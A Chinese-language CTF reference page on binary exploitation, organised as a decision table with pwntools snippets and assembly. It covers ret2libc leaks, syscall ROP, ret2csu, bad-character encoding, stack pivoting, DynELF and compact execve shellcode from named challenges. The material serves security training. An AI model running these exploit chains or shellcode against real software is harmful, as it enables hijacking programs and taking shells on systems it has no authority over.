---

phase: binary
vuln_class: [pwn, rop, ret2libc, shellcode, stack-pivot, ret2csu]
title: ROP 与 shellcode
summary: 卡点决定手法——没 libc 就两阶段泄、没 gadget 就 ret2csu 或冷门指令、有坏字符就编码或 sprintf 逐字节拼、空间太小就压 shellcode 或枢轴换栈。
---

# ROP 与 shellcode

溢出点与偏移见 [[binary/漏洞利用/栈与基础溢出.md|栈与基础溢出]]；原语查表见 [[binary/漏洞利用/原语速查表.md|原语速查表]]；SROP/双枢轴/`retf` 换架构见 [[binary/漏洞利用/ROP 进阶.md|ROP 进阶]]；总览见 [[binary/漏洞利用/二进制漏洞利用.md|漏洞利用总览]]。

## 0. 判据速查

| 卡在哪 | 首选手法 | 去哪节 |
|---|---|---|
| 不知道 libc 版本 | 两阶段：`puts@plt` 泄 GOT → 重入 → 打一发 | §1 |
| 泄完回不到第二次输入 | 返回 `main` 里 `call vuln` 那条指令 | §1 |
| 泄出来的字节前面粘了别的输出 | `printf` 没尾换行，`recvuntil` 前缀再 `recvline` | §1 |
| 调 `system()`/`execve()` 就 SIGSEGV | 走裸 `syscall`，绕过 libc 序言与 CET | §2 |
| 找不到 `pop rdx; ret` | 找 `pop rdx; pop rbx; ret`（glibc 2.35 约 `0x904a9`） | §2 |
| 调完 `puts` 后 `rdx` 被踩成 1 | 三种解法：libc gadget / 重入 `read` / `leave` 枢轴 | §3 |
| 二进制里一个 `pop rdx` 都没有 | `__libc_csu_init` 两段 gadget | §4 |
| payload 不能含 null/换行/空格 | XOR 编码后原地解，或 `sprintf` 逐字节拼 | §5 |
| 连 `mov [reg],reg` 都没有 | `BEXTR`+`XLAT`+`STOSB` / `PEXT` | §5 |
| 缓冲区装不下整条链 | `xchg rax,esp` 枢轴（注意 32 位截断） | §6 |
| 远程 libc 未知且能任意读 | pwntools `DynELF` | §7 |
| shellcode 只剩 15 字节 | `cdq` + `push/pop` 压缩，先审入口寄存器 | §8 |
| 需要 `rdx=0` 但没 gadget | canary 校验尾声 `xor rdx, fs:28h` | §9.1 |
| 8 字节且每字节唯一 | `syscall` 把 RIP 存进 RCX 当自定位 | §9.2 |
| 没有 `pop rax` 但只有 `read` | 让 `read` 正好返回 `0x142` → `stub_execveat` | §9.3 |
| 只允许字母数字 | 3 字节 `push r12; pop rax` 播种，再交给编码器 | §9.4 |
| 拿到 shell 后命令被吃掉 | `sleep(1)` 再 `sendline`，别用 stdin 管道 | §10 |

## 1. 两阶段 ret2libc

第一阶段只做一件事：把某个 libc 函数的真实地址打到 stdout。第二阶段用算出的基址重新打一次。

```python
payload1  = b'A' * offset
payload1 += p64(pop_rdi) + p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(CALL_VULN_ADDR)      # ← 关键
```

**返回目标的选择是这一步唯一的坑**：回 `main` 可能被 `check_status`/`setup` 之类的初始化把栈或全局状态弄脏；直接回 `vuln` 函数入口往往栈不平衡。**正解是回 `main` 里 `call vuln` 那条指令**（`objdump -d` 找，如 `0x401239`）——`CALL` 会重新压返回地址、建立干净栈帧，等价于「程序自己又调了一次漏洞函数」。

**没有尾换行的泄漏解析**：`printf("Laundry complete")` 不带 `\n` 时，`puts()` 泄出的 6 字节紧贴在同一行：

```python
p.recvuntil(b'Laundry complete')
leaked = p.recvline().strip()        # 只有这 6 字节
libc.address = u64(leaked.ljust(8, b'\x00')) - libc.sym['puts']
```

用 `recvline()` 而不 `recv(6)` 也行，但必须先吃掉前缀，否则 `u64` 会读到 `e` 和空格。

## 2. 裸 syscall ROP

`system()` 和 `execve()` 都走 libc 函数序言：可能踩栈对齐、可能被 CET/IBT 拦。裸 `syscall` 指令绕过全部序言，是最稳的兜底。

```python
libc_rop = ROP(libc)
pop_rax      = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdx_rbx  = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]

payload  = b'A' * offset
payload += flat(pop_rax, 59,                                   # execve
                pop_rdi, libc_base + next(libc.search(b'/bin/sh')),
                pop_rsi, 0,
                pop_rdx_rbx, 0, 0,                             # rdx=0, rbx 垃圾
                libc_base + syscall_ret)
```

**`pop rdx; ret` 在现代 libc 里基本不存在**，别浪费时间搜；直接找带副作用的 `pop rdx; pop rbx; ret`。同理 `pop rsi` 后面常粘 `pop r15`。

## 3. `rdx` 控制的三种解法

调过 `puts`/`printf` 之后 `rdx` 常被踩成 1，后面所有 `read(fd, buf, rdx)` 都只读 1 字节。

1. **libc gadget**：`pop rdx; pop rbx; ret`，多喂一个垃圾值。
2. **重入二进制的 `read` 设置段**：跳到 `lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read` 这条链的中段，先 `pop rbp` 把 `rbp-0x40` 对准目标缓冲区。

   ```python
   payload += p64(POP_RBP_RET) + p64(TARGET_ADDR + 0x40)
   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
   ```

3. **顺手拿 `leave;ret` 做枢轴**：第 2 种做法里 `read` 之后紧接着 `printf` + `leave;ret`，`leave` 会把 `rsp = rbp`——于是 `read` 进来的数据里 `rbp+8` 开始就是下一段链。等于一次调用同时拿到「写内存」和「换栈」。

## 4. ret2csu

二进制里没有 `pop rdx`，但 `__libc_csu_init` 几乎在所有动态链接 ELF 里存在，且提供两段：

```asm
; gadget 1：弹参数
pop rbx        ; 填 0
pop rbp        ; 填 1
pop r12        ; 要调的函数指针（通常填 GOT 项地址）
pop r13        ; → edi
pop r14        ; → rsi
pop r15        ; → rdx
ret

; gadget 2：搬运并调用
mov rdx, r15
mov rsi, r14
mov edi, r13d
call qword ptr [r12 + rbx*8]
```

用法：gadget 1 弹满 6 个值 → gadget 2 搬进寄存器 → `call [r12+rbx*8]`。**`rbx` 必须是 0，`rbp` 必须是 1**，否则 `call` 之后那段 `add rbx,1; cmp rbp,rbx; jne` 循环会跑飞。填 `r12 = GOT['puts']` 就是 `call puts@plt` 的效果，不需要 PLT 地址。

代价：一次只能设 3 个参数，且中间要吞掉 7 个 qword 的栈槽。只在真没别的 gadget 时用。

## 5. 坏字符绕过

### 5.1 XOR 编码后原地解

需要往内存写 `"/bin/sh"` 或 `"flag.txt"`，但 payload 过滤 null/换行。

```asm
pop r14; pop r15; ret          ; r14 = 密钥, r15 = 目标地址
mov [r15], r14; ret            ; 写入编码值
xor [r15], r14; ret            ; 原地解回
```

```python
encoded = bytes(b ^ KEY for b in target)
for i in range(0, len(encoded), 8):
    payload += flat(pop_r14_r15, encoded[i:i+8].ljust(8, b'\x00'),
                    data_sec + i, mov_r15_r14)
for i in range(0, len(target), 8):
    payload += flat(pop_r14_r15, p64(KEY), data_sec + i, xor_r15_r14)
payload += flat(pop_rdi, data_sec, elf.plt['print_file'])
```

XOR 自逆（`a^k^k == a`），所以写入和解码可以是同一段 gadget。密钥不一定要全局统一——逐字节解方程：每个位置找任意一个 `key` 使 `orig ^ key` 落在白名单内。

### 5.2 `sprintf` 逐字节拼（PlaidCTF 2013）

`sprintf(dst, src)` 遇 null 停止，所以当 `src` 指向「一个目标字节 + `\x00`」时等效单字节拷贝。源地址直接取自二进制自己的 `.text`/`.rodata`——那些字节天然不含坏字符。

```python
byte_addrs = {}
for c in range(256):
    for i in range(len(exe_data)):
        if exe_data[i] == c and not has_bad_chars(p32(exe_base + i)):
            byte_addrs[c] = exe_base + i
            break

for i, byte in enumerate(shellcode):
    rop += flat(sprintf_plt, pop3ret, bss + i, byte_addrs[byte], 0)
rop += p32(bss)
```

必须有一个 `pop3ret`（32 位下清 3 个参数槽）。整条链长度 = `shellcode 长度 × 5` 个指针，空间要够。

### 5.3 冷门指令当写原语

标准 `mov [reg], reg` 不存在时，x86 还有一批「一辈子用不上」的指令能拼出字节写：

**64 位：`BEXTR` + `XLAT` + `STOSB`**

```python
xlat_ret  = questionableGadgets          # xlat byte ptr [rbx]; ret   → al = [rbx+al]
bextr_ret = questionableGadgets + 2      # pop rdx; pop rcx; add rcx,0x3ef2; bextr rbx,rcx,rdx; ret
stosb_ret = questionableGadgets + 17     # stosb byte ptr [rdi], al; ret  → [rdi]=al, rdi++

for i, ch in enumerate(b"flag.txt"):
    char_addr = next(elf.search(bytes([ch])))
    payload += flat(bextr_ret,
                    0x4000,                 # rdx: 从第 0 位取 64 位
                    char_addr - 0x3ef2,     # 补偿 gadget 里的 add
                    xlat_ret,               # al = [rbx + al]
                    pop_rdi, data_sec + i,
                    stosb_ret)
```

`BEXTR` 在这里的作用只是把「某个地址」塞进 `rbx`，`XLAT` 才是取字节的那一步，`STOSB` 负责落盘并自增指针。三段串起来就是「按地址取一字节写到目标」。

**32 位：`PEXT`**

`PEXT(src, mask)` 按 mask 选位并压紧，所以只要算出一个 mask 让 `PEXT(0xb0bababa, mask)` 等于目标字节即可。配 `bswap` + `xchg [ecx], dl` 完成写入。

```python
def find_mask(target_byte, source=0xb0bababa):
    sb = [(source >> i) & 1 for i in range(32)]
    tb = [(target_byte >> i) & 1 for i in range(8)]
    mask, matched = 0, 0
    for i in range(32):
        if matched < 8 and sb[i] == tb[matched]:
            mask |= (1 << i); matched += 1
    return mask if matched == 8 else None
```

## 6. 栈枢轴

缓冲区装不下整条链，但程序泄了一个堆/栈地址且那处有可控数据。

```python
payload = flat(b'A' * offset,
               pop_rax, pivot_addr,
               xchg_rax_esp)      # rsp ↔ esp
```

**`xchg rax, esp` 在 x86-64 上把 `rsp` 高 32 位清零**（`esp` 只有 32 位）。所以 pivot 地址必须落在低 4GB：堆、`mmap` 区通常满足；栈地址（`0x7fff...`）一定不满足，用了必崩。

与 `leave;ret` 的分工：`leave` 要控 `rbp`，`xchg` 要控 `rax`。小缓冲区溢出往往碰不到保存的 `rbp`，此时 `xchg` 是唯一选择。

## 7. DynELF

远程 libc 版本未知，但有一个能读任意地址的原语（格式串、或 `printf` + 重入）。

```python
def leak(addr):
    p.sendline(flat(b'A' * offset, p64(elf.plt['printf'],
                                       p64(main_addr), p64(addr))))
    return p.recvuntil(b'prompt', drop=True)

d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
binsh_addr  = d.lookup(None, 'libc')
```

`DynELF` 自己解析 `.dynamic` → link_map → 符号表，不需要 libc 文件。代价是每次 `lookup` 都发很多次请求，慢；能拿到 libc 文件时优先直接对版本。

## 8. 小空间 shellcode

### 8.1 15 字节 execve（TUM CTF 2016）

```asm
lea rdi, [rsp + 0x19]    ; 4  — "/bin/sh" 在 shellcode 之后的栈上
cdq                      ; 1  — edx = 0（eax 符号扩展到 edx），比 xor edx,edx 省 1 字节
push rdx                 ; 1  — argv 结尾 NULL
push rdi                 ; 1  — argv[0]
push rsp                 ; 1
pop rsi                  ; 1  — rsi = argv
push 0x3b                ; 2
pop rax                  ; 1
syscall                  ; 2
```

压缩技巧只有两条：`cdq` 一字节清 `rdx`（前提 `eax` 非负）；`push reg; pop reg` 两字节代替 `mov` 三字节。

### 8.2 AES 块约束

shellcode 必须正好一个 AES 块且被解密后执行时，反推 IV：

```python
crafted_iv = AES_decrypt(known_ciphertext_block) ^ shellcode
```

因为 CBC 首块解密后异或 IV，所以把「期望的明文」与「解出来的中间值」异或即得 IV。

### 8.3 先审入口寄存器

写 shellcode 前先在 gdb 里 `b *shellcode_entry` + `info registers`。已就绪的 `eax`（syscall 号）、`ebx`（fd）、`rsp`（可写区）都能直接省掉：

```asm
; 入口 eax=4 (write), ebx=1 (stdout)，只缺 ecx/edx
lea ecx, [edi + flag_offset]   ; 3
mov dl, 64                     ; 2
int 0x80                       ; 2   → 共 7 字节，edx 已就绪时 5 字节
```

## 9. 特殊约束

### 9.1 canary 尾声当 `rdx` 清零 gadget（VolgaCTF 2017）

`execve(path, argv, NULL)` 要 `rdx=0` 但没有 `pop rdx`。每个带 canary 的函数尾声都有：

```asm
mov rdx, [rsp+8]
xor rdx, qword ptr fs:[0x28]    ; canary 完好时结果恒为 0
```

直接跳进这条指令当 gadget 用。副作用只是后续 `je` 的一次无害跳转。搜 `xor rdx, qword ptr fs:` 就能定位。

### 9.2 `syscall` 把 RIP 存进 RCX（HITCON 2017）

8 字节 stager，且每字节唯一：

```python
stager = bytes([0x0f,0x05, 0x51, 0x5e, 0x31,0xd2, 0xb2,0x64])
# syscall → read(0, buf, 8)，同时 rcx = &next_instr = buf+2
# push rcx; pop rsi   → rsi = buf+2
# xor edx,edx; mov dl,100 → rdx = 100
assert len(set(stager)) == len(stager)
p.send(stager); p.send(asm(shellcraft.sh()))
```

不需要任何硬编码地址——`syscall` 的副作用自带自定位。

### 9.3 `stub_execveat` 顶 `execve`（ASIS CTF 2018）

只有 `read`、没有 `pop rax` 时，`rax` 唯一的控制入口是 `read()` 的返回值。`stub_execveat` 是 syscall **322 = 0x142**，用 `AT_FDCWD` 时参数与 `execve` 完全一致：

```python
payload  = b"/bin/sh\x00"
payload += b"B" * (0x148 - 8*4 - 8)
payload += p64(xor_rdx_syscall) + p64(syscall_gadget)
payload += b"A" * (0x142 - len(payload) - 1)   # 总长正好 0x142
p.send(payload)
```

发送字节数就是 syscall 号。任何「返回长度可控」的读操作都能这样当 `pop rax` 用。

### 9.4 字母数字 bootstrap（nullcon HackIM 2019）

字母数字编码器输出的自解码 stub 要求入口满足 `rax + padding_len == shellcode_address`。harness 入口 `rax=0` 时它无处落脚，前面塞 3 字节：

```python
bootstrap = asm("push r12; pop rax;")   # 41 54 58 = "ATX"，恰好过字母数字过滤
payload = bootstrap + alphanum_encoder(sc, 3)   # padding_len 必须等于 3
```

`r12` 在 Linux 上通常就是 `_start`，是现成的有效地址。**`padding_len` 必须精确等于前置字节数**，否则解码起点偏了。

## 10. execve 之后的交互

shell 读的是同一个 stdin，早发的命令会被前面残留的 `read()` 吃掉。

```python
p.send(payload)
time.sleep(1)                      # 等 shell 起
p.sendline(b'id'); time.sleep(0.5)
p.sendline(b'cat /flag* flag* 2>/dev/null')
```

**不要用 stdin 管道喂命令**，一定显式 `sendline` + 延迟。

## 11. 纪律

- **先定卡点再选手法**。上面 20 行判据表就是决策树，别上来就 `ROP(elf).chain()`。
- **gadget 不够是常态，不是异常**。缺 `pop rdx` 走 ret2csu、缺写原语走 `XLAT/STOSB`、缺 `pop rax` 走返回值——每一类都有成熟替代。
- **两阶段永远先验证第一阶段**：泄出的 6 字节要对得上 `libc.sym['puts']` 的低 12 位（`0x?e50` 之类），对不上说明返回目标选错或解析偏了一位。
- **报的是「哪个寄存器没设对」，不是「ROP 不工作」**。崩在 `movaps` = 对齐；崩在 `syscall` 后 = 参数；崩在 `ret` = 栈被踩。
- **shellcode 字节数要数**，15 字节方案里每个指令都是被逼出来的，别随手加 `xor`。
